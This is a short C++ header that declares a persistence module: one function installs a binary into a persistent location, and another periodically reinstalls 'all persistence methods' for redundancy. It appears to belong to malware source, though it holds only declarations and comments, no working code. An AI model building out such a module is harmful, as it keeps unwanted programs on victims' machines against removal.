#pragma once
#include <string>

namespace persistence {

// Establishes persistence.
// Returns the path of the persisted binary if successful (or if already running from it).
// Returns an empty string on failure.
std::wstring establishPersistence(const std::wstring& overrideSourcePath = L"");

// Periodically re-installs all persistence methods to ensure redundancy.
void ReinstallPersistence();

} // namespace persistence
